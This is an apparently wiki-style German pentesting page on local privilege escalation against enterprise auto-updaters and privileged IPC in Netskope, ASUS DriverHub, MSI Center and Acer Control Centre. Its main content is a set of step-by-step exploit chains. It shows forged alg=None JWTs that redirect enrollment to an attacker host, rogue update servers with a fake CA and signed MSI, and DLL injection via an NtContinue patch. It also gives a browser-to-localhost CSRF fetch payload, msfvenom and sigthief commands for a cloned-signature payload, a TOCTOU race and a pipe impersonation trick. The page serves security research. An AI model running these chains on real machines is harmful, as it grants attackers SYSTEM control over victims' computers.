# Missbrauch von Enterprise Auto-Updaters und privilegiertem IPC (z. B. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Diese Seite verallgemeinert eine Klasse von Windows local privilege escalation Chains, die in Enterprise-Endpoint-Agents und Updaters gefunden wurden und eine niedrig\-schwellige IPC-Oberfläche sowie einen privilegierten Update-Flow bereitstellen. Ein repräsentatives Beispiel ist Netskope Client for Windows < R129 (CVE-2025-0309), bei dem ein niedrig\-privilegierter Benutzer die Registrierung auf einen vom Angreifer\-kontrollierten Server erzwingen kann und anschließend ein bösartiges MSI liefert, das der SYSTEM-Dienst installiert.

Kernideen, die Sie gegen ähnliche Produkte wiederverwenden können:
- Missbrauchen Sie die localhost-IPC eines privilegierten Dienstes, um eine erzwungene re\-Registrierung oder Neukonfiguration auf einen Angreifer-Server durchzuführen.
- Implementieren Sie die Update-Endpunkte des Vendors, liefern Sie eine rogue Trusted Root CA und weisen Sie den Updater auf ein bösartiges, „signed“ Paket.
- Umgehen Sie schwache Signer-Prüfungen (CN allow\-lists), optionale Digest-Flags und lax MSI-Eigenschaften.
- Falls IPC „verschlüsselt“ ist, leiten Sie den Key/IV aus welt\-lesbaren Maschinenidentifikatoren ab, die in der Registry gespeichert sind.
- Falls der Dienst Anrufer nach Image-Pfad/Process-Name einschränkt, injizieren Sie in einen allow\-listed Prozess oder starten Sie einen solchen suspended und bootstrapen Sie Ihre DLL via einem minimalen Thread\-Context-Patch.

---
## 1) Erzwingen der Registrierung auf einen Angreifer-Server über localhost IPC

Viele Agents liefern einen user\-mode UI-Prozess, der über localhost TCP mit einem SYSTEM-Dienst unter Verwendung von JSON kommuniziert.

Beobachtet bei Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit-Ablauf:
1) Erstellen Sie ein JWT enrollment-Token, dessen Claims den Backend-Host steuern (z. B. AddonUrl). Verwenden Sie alg=None, sodass keine Signatur erforderlich ist.
2) Senden Sie die IPC-Nachricht, die den provisioning-Befehl mit Ihrem JWT und Tenant-Namen aufruft:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Der service beginnt, deinen rogue server für enrollment/config anzusprechen, z. B.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Hinweise:
- Wenn die caller verification path/name\-based ist, sende die Anfrage von einer allow\-listed vendor binary aus (siehe §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Sobald der client mit deinem server spricht, implementiere die erwarteten endpoints und leite ihn zu einem attacker MSI. Typische Abfolge:

1) /v2/config/org/clientconfig → Gib JSON config mit einem sehr kurzen updater interval zurück, z. B.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Gibt ein PEM-CA-Zertifikat zurück. Der Dienst installiert es im Trusted Root Store des Local Machine.
3) /v2/checkupdate → Liefert Metadaten, die auf eine bösartige MSI und eine gefälschte Version verweisen.

Bypassing common checks seen in the wild:
- Signer CN allow\-list: der Dienst prüft möglicherweise nur, ob der Subject CN „netSkope Inc“ oder „Netskope, Inc.“ entspricht. Deine rogue CA kann ein Leaf mit diesem CN ausstellen und die MSI signieren.
- CERT_DIGEST property: Füge eine harmlose MSI-Eigenschaft namens CERT_DIGEST hinzu. Keine Durchsetzung bei der Installation.
- Optional digest enforcement: ein Konfig-Flag (z. B. check_msi_digest=false) deaktiviert zusätzliche kryptografische Validierung.

Result: der SYSTEM-Dienst installiert deine MSI aus
C:\ProgramData\Netskope\stAgent\data\*.msi
und führt beliebigen Code als NT AUTHORITY\SYSTEM aus.

---
## 3) Forging encrypted IPC requests (when present)

Ab R127 hat Netskope IPC JSON in ein encryptData-Feld gepackt, das wie Base64 aussieht. Reverse-Engineering zeigte AES mit Key/IV, abgeleitet von Registry-Werten, die von jedem Benutzer lesbar sind:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Angreifer können die Verschlüsselung reproduzieren und gültige verschlüsselte Befehle als Standardbenutzer senden. Allgemeiner Tipp: Wenn ein Agent plötzlich seine IPC „verschlüsselt“, suche nach device IDs, product GUIDs, install IDs unter HKLM als Material.

---
## 4) Bypassing IPC caller allow\-lists (path/name checks)

Einige Dienste versuchen, den Peer zu authentifizieren, indem sie die PID der TCP-Verbindung ermitteln und den Image-Pfad/-Namen mit allow\-listed Vendor-Binaries unter Program Files vergleichen (z. B. stagentui.exe, bwansvc.exe, epdlp.exe).

Zwei praktische Umgehungen:
- DLL injection in einen allow\-listed Prozess (z. B. nsdiag.exe) und Proxying der IPC von innen.
- Starte ein allow\-listed Binary im suspended Zustand und bootstrappe deine Proxy-DLL ohne CreateRemoteThread (siehe §5), um treiberdurchgesetzte Tamper-Regeln zu erfüllen.

---
## 5) Tamper\-protection friendly injection: suspended process + NtContinue patch

Produkte enthalten häufig einen minifilter/OB callbacks-Treiber (z. B. Stadrv), der gefährliche Rechte von Handles zu geschützten Prozessen entfernt:
- Process: entfernt PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beschränkt auf THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ein zuverlässiger user\-mode Loader, der diese Einschränkungen beachtet:
1) CreateProcess eines Vendor-Binaries mit CREATE_SUSPENDED.
2) Erhalte Handles, die dir noch erlaubt sind: PROCESS_VM_WRITE | PROCESS_VM_OPERATION für den Prozess, und ein Thread-Handle mit THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (oder nur THREAD_RESUME, wenn du Code an einer bekannten RIP patchst).
3) Überschreibe ntdll!NtContinue (oder einen anderen früh geladenen, guaranteed\-mapped thunk) mit einem kleinen Stub, der LoadLibraryW auf deinen DLL-Pfad aufruft, und dann zurückspringt.
4) ResumeThread, um deinen Stub in-process auszulösen und deine DLL zu laden.

Weil du PROCESS_CREATE_THREAD oder PROCESS_SUSPEND_RESUME bei einem bereits\-geschützten Prozess nie verwendet hast (du hast ihn erstellt), ist die Richtlinie des Treibers erfüllt.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatisiert eine rogue CA, das Signieren bösartiger MSI und stellt die benötigten Endpunkte bereit: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope ist ein custom IPC-Client, der beliebige (optional AES\-verschlüsselte) IPC-Nachrichten erstellt und die suspended\-process Injection enthält, damit sie von einem allow\-listed Binary ausgeht.

---
## 1) Browser\-to\-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub liefert einen user\-mode HTTP-Service (ADU.exe) auf 127.0.0.1:53000, der Browseraufrufe von https://driverhub.asus.com erwartet. Der Origin-Filter führt einfach `string_contains(".asus.com")` über den Origin-Header und über Download-URLs, die von `/asus/v1.0/*` exponiert werden, aus. Jeder attacker\-kontrollierte Host wie `https://driverhub.asus.com.attacker.tld` besteht daher die Prüfung und kann zustandsändernde Requests von JavaScript ausführen. Siehe [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) für zusätzliche Bypass-Muster.

Praktischer Ablauf:
1) Registriere eine Domain, die `.asus.com` einbettet, und hoste dort eine bösartige Webseite.
2) Verwende `fetch` oder XHR, um einen privilegierten Endpoint (z. B. `Reboot`, `UpdateApp`) auf `http://127.0.0.1:53000` aufzurufen.
3) Sende den vom Handler erwarteten JSON-Body – das gepackte Frontend-JS zeigt unten das Schema.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Sogar die unten gezeigte PowerShell CLI funktioniert, wenn der Origin header auf den vertrauenswürdigen Wert gefälscht wird:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1\-click (or 0\-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code\-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` lädt beliebige ausführbare Dateien, die im JSON-Body definiert sind, und cached sie in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Die Download-URL-Validierung verwendet dieselbe Substring-Logik, sodass `http://updates.asus.com.attacker.tld:8000/payload.exe` akzeptiert wird. Nach dem Download prüft ADU.exe lediglich, dass das PE eine Signatur enthält und dass der Subject-String mit ASUS übereinstimmt, bevor es ausgeführt wird – kein `WinVerifyTrust`, keine Chain-Validierung.

Um den Ablauf auszunutzen:
1) Erstelle ein Payload (z. B. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Klone den ASUS-Signer hinein (z. B. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Stelle `pwn.exe` auf einer `.asus.com`-ähnlichen Domain bereit und löse UpdateApp über den oben beschriebenen Browser-CSRF aus.

Weil sowohl die Origin- als auch die URL-Filter Substring-basiert sind und die Signer-Prüfung nur Strings vergleicht, lädt DriverHub die Angreifer-Binärdatei und führt sie in seinem erhöhten Kontext aus.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

Der SYSTEM-Service von MSI Center bietet ein TCP-Protokoll, bei dem jeder Frame `4-byte ComponentID || 8-byte CommandID || ASCII arguments` ist. Die Kernkomponente (Component ID `0f 27 00 00`) liefert `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Ihr Handler:
1) Kopiert das gelieferte ausführbare Programm nach `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifiziert die Signatur via `CS_CommonAPI.EX_CA::Verify` (Certificate Subject muss „MICRO-STAR INTERNATIONAL CO., LTD.“ entsprechen und `WinVerifyTrust` muss erfolgreich sein).
3) Erstellt eine geplante Aufgabe, die die Temp-Datei als SYSTEM mit vom Angreifer kontrollierten Argumenten ausführt.

Die kopierte Datei wird zwischen der Verifikation und `ExecuteTask()` nicht gesperrt. Ein Angreifer kann:
- Frame A senden, der auf ein legitim MSI-signiertes Binary zeigt (garantiert, dass die Signaturprüfung besteht und die Aufgabe in die Warteschlange gestellt wird).
- Gleichzeitig mit wiederholten Frame-B-Nachrichten rennen, die auf ein bösartiges Payload verweisen und `MSI Center SDK.exe` unmittelbar nach der Verifikation überschreiben.

Wenn der Scheduler ausgelöst wird, führt er das überschriebenen Payload als SYSTEM aus, obwohl die ursprüngliche Datei validiert wurde. Zuverlässige Ausnutzung verwendet zwei goroutines/Threads, die CMD_AutoUpdateSDK spammen, bis das TOCTOU-Fenster gewonnen ist.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Jedes Plugin/DLL, das von `MSI.CentralServer.exe` geladen wird, erhält eine Component ID, die unter `HKLM\SOFTWARE\MSI\MSI_CentralServer` gespeichert ist. Die ersten 4 Bytes eines Frames wählen diese Komponente aus und erlauben Angreifern, Befehle an beliebige Module zu leiten.
- Plugins können ihre eigenen Task-Runner definieren. `Support\API_Support.dll` exponiert `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` und ruft direkt `API_Support.EX_Task::ExecuteTask()` mit **no signature validation** auf – jeder lokale Benutzer kann es auf `C:\Users\<user>\Desktop\payload.exe` zeigen und deterministisch SYSTEM-Ausführung erhalten.
- Das Sniffen des Loopbacks mit Wireshark oder das Instrumentieren der .NET-Binaries in dnSpy offenbart schnell die Component ↔ command-Zuordnung; eigene Go-/Python-Clients können dann Frames replayen.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exponiert `\\.\pipe\treadstone_service_LightMode`, und seine discretionary ACL erlaubt Remote-Clients (z. B. `\\TARGET\pipe\treadstone_service_LightMode`). Das Senden der Command ID `7` mit einem Dateipfad ruft die Prozess-Erzeugungsroutine des Dienstes auf.
- Die Client-Bibliothek serialisiert ein magic terminator byte (113) zusammen mit den args. Dynamische Instrumentierung mit Frida/`TsDotNetLib` (siehe [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) für Instrumentierungstipps) zeigt, dass der native Handler diesen Wert auf ein `SECURITY_IMPERSONATION_LEVEL` und eine Integrity SID abbildet, bevor `CreateProcessAsUser` aufgerufen wird.
- Das Ersetzen von 113 (`0x71`) durch 114 (`0x72`) führt in den generischen Zweig, der das komplette SYSTEM-Token behält und eine High-Integrity-SID (`S-1-16-12288`) setzt. Das gestartete Binary läuft daher als uneingeschränktes SYSTEM, sowohl lokal als auch zwischen Maschinen.
- Kombiniere das mit dem exponierten Installer-Flag (`Setup.exe -nocheck`), um ACC selbst auf Lab-VMs zu installieren und die Pipe ohne Vendor-Hardware zu testen.

Diese IPC-Bugs verdeutlichen, warum localhost-Services gegenseitige Authentifizierung durchsetzen müssen (ALPC SIDs, `ImpersonationLevel=Impersonation`-Filter, token filtering) und warum der “run arbitrary binary”-Helper jedes Moduls dieselben Signer-Überprüfungen teilen muss.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)

{{#include ../../banners/hacktricks-training.md}}
